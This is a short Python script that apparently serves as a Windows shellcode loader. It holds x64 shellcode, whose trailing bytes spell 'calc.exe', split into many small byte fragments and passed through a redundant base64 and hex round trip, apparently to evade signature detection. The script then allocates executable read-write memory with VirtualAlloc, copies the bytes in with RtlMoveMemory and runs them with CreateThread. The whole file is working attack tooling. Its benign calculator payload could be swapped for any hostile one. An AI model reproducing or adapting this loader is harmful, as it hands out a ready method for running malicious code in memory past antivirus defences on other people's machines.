#!/usr/bin python3
# -*- coding: utf-8 -*-

import ctypes
import base64
import os
import  binascii



a = b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41"

b = b"\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48"

c = b"\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f"

d = b"\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c"

e = b"\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52"

f = b"\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b"

g = b"\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0"

h = b"\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56"

i = b"\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9"

j = b"\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0"

k = b"\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58"

l = b"\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"

m= b"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0"

n = b"\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"

o = b"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"

p = b"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00"

q = b"\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41"

r = b"\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41"

s = b"\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06"

t = b"\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"

x = b"\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65"

y = b"\x78\x65\x00"

buf = base64.b64encode(a+b+c+d+e+f+g+h+i+j+k+l+m+n+o+p+q+r+s+t+x+y)

shift = base64.b64decode(buf)

ttp = shift.hex()
tty = bytes.fromhex(ttp)

VIRTUAL_MEM = ( 0x1000 | 0x2000 )
PAGE_EXECUTE_READWRITE = 0x00000040
buf_array = bytearray(tty)
print(buf_array)

kernel32 = ctypes.cdll.LoadLibrary("kernel32.dll")
kernel32.VirtualAlloc.restype = ctypes.c_uint64
#函数申请内存
sc_ptr = kernel32.VirtualAlloc(ctypes.c_int(0),
                                          ctypes.c_int(len(buf_array)),
                                          ctypes.c_int(0x3000),
                                          ctypes.c_int(0x40))

buf_ptr = (ctypes.c_char * len(buf_array)).from_buffer(buf_array)

print(sc_ptr)
print(buf_ptr)

kernel32.RtlMoveMemory(ctypes.c_uint64(sc_ptr),
                                     buf_ptr,
                                     ctypes.c_int(len(buf_array)))


handle = kernel32.CreateThread(ctypes.c_int(0),
                                             ctypes.c_int(0),
                                             ctypes.c_uint64(sc_ptr),
                                             ctypes.c_int(0),
                                             ctypes.c_int(0),
                                             ctypes.pointer(ctypes.c_int(0)))

kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))












